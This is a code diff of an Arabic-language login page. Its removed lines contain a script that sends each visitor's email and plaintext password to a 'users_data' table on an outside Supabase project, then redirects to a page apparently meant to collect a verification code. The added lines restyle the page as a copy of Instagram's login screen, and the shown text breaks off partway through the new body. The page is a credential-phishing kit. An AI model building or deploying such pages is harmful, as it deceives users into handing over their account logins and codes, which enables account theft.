@@ -3,133 +3,124 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تسجيل الدخول</title>
+  <title>تسجيل الدخول • Instagram</title>
   <style>
     * {
       box-sizing: border-box;
+      margin: 0;
+      padding: 0;
     }
     body {
-      font-family: Arial, sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       background-color: #fafafa;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      margin: 0;
-      padding: 20px;
+      direction: rtl;
     }
-    .login-card {
-      background: #ffffff;
-      border: 1px solid #dbdbdb;
-      padding: 30px;
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
       width: 100%;
       max-width: 350px;
-      text-align: center;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+      margin: 20px auto;
     }
-    h2 {
-      margin-top: 0;
-      margin-bottom: 20px;
-      color: #262626;
-      font-size: 22px;
-    }
-    input {
-      width: 100%;
-      padding: 12px;
-      margin: 8px 0;
+    .box {
+      background-color: #ffffff;
       border: 1px solid #dbdbdb;
-      border-radius: 4px;
-      background: #fafafa;
-      font-size: 14px;
-      outline: none;
+      border-radius: 1px;
+      padding: 30px 40px;
+      width: 100%;
+      text-align: center;
+      margin-bottom: 10px;
     }
-    input:focus {
+    .logo {
+      font-family: 'Grand Hotel', cursive, sans-serif;
+      font-size: 38px;
+      margin-bottom: 30px;
+      font-weight: normal;
+      color: #262626;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+    .input-field {
+      width: 100%;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 9px 8px;
+      font-size: 12px;
+      margin-bottom: 6px;
+      outline: none;
+      direction: rtl;
+    }
+    .input-field:focus {
       border-color: #a8a8a8;
     }
-    button {
-      width: 100%;
-      padding: 10px;
+    .btn-login {
       background-color: #0095f6;
-      color: white;
       border: none;
       border-radius: 4px;
-      font-weight: bold;
+      color: #ffffff;
+      font-weight: 600;
+      padding: 7px;
       font-size: 14px;
       cursor: pointer;
+      margin-top: 8px;
+    }
+    .btn-login:disabled {
+      background-color: rgba(0, 149, 246, 0.3);
+      cursor: default;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 15px 0;
+      color: #8e8e8e;
+      font-size: 12px;
+      font-weight: 600;
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background-color: #dbdbdb;
+    }
+    .divider span {
+      padding: 0 15px;
+    }
+    .fb-login {
+      color: #385185;
+      font-size: 14px;
+      font-weight: 600;
+      text-decoration: none;
+      margin: 10px 0;
+      display: block;
+    }
+    .forgot-password {
+      color: #00376b;
+      font-size: 12px;
+      text-decoration: none;
       margin-top: 10px;
+      display: block;
     }
-    button:hover {
-      background-color: #1877f2;
+    .signup-box {
+      font-size: 14px;
+      color: #262626;
     }
-    button:disabled {
-      background-color: #b2dffc;
-      cursor: not-allowed;
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: 600;
     }
   </style>
-  <!-- مكتبة Supabase JS -->
+  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body>
 
-  <div class="login-card">
-    <h2>تسجيل الدخول</h2>
-    <form id="loginForm">
-      <input type="email" id="email" placeholder="البريد الإلكتروني (@gmail.com)" required>
-      <input type="password" id="password" placeholder="كلمة السر" required>
-      <button type="submit" id="submitBtn">متابعة</button>
-    </form>
-  </div>
-
-  <script>
-    // إعداد الاتصال بـ Supabase
-    const SUPABASE_URL = 'https://snetqzdsjfjygjlpwzbi.supabase.co';
-    const SUPABASE_KEY = 'sb_publishable_hG2eyT1OpV7SlR_rNmMQEQ_dGLtFq0W';
-    const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-
-    const form = document.getElementById('loginForm');
-    const submitBtn = document.getElementById('submitBtn');
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      
-      const email = document.getElementById('email').value.trim();
-      const password = document.getElementById('password').value;
-
-      // التأكد من أن الإيميل ينتهي بـ @gmail.com
-      if (!email.toLowerCase().endsWith('@gmail.com')) {
-        alert('يرجى إدخال بريد إلكتروني ينتهي بـ @gmail.com');
-        return;
-      }
-
-      submitBtn.disabled = true;
-      submitBtn.innerText = 'جاري الإرسال...';
-
-      try {
-        // إدخال الإيميل وكلمة السر في جدول users_data
-        const { data, error } = await supabaseClient
-          .from('users_data')
-          .insert([{ email: email, password: password }])
-          .select();
-
-        if (error) {
-          console.error('Error inserting data:', error);
-          alert('حدث خطأ أثناء حفظ البيانات: ' + error.message);
-          submitBtn.disabled = false;
-          submitBtn.innerText = 'متابعة';
-        } else if (data && data.length > 0) {
-          // حفظ ID السطر المنشأ للاستفادة منه في إضافة الكود لاحقاً
-          localStorage.setItem('user_row_id', data[0].id);
-          // التحويل إلى صفحة إدخال الكود
-          window.location.href = '/code.html';
-        }
-      } catch (err) {
-        console.error('Unexpected error:', err);
-        alert('حدث خطأ غير متوقع!');
-        submitBtn.disabled = false;
-        submitBtn.innerText = 'متابعة';
-      }
-    });
-  </script>
-</body>
-</html>
+  <div class="main-container
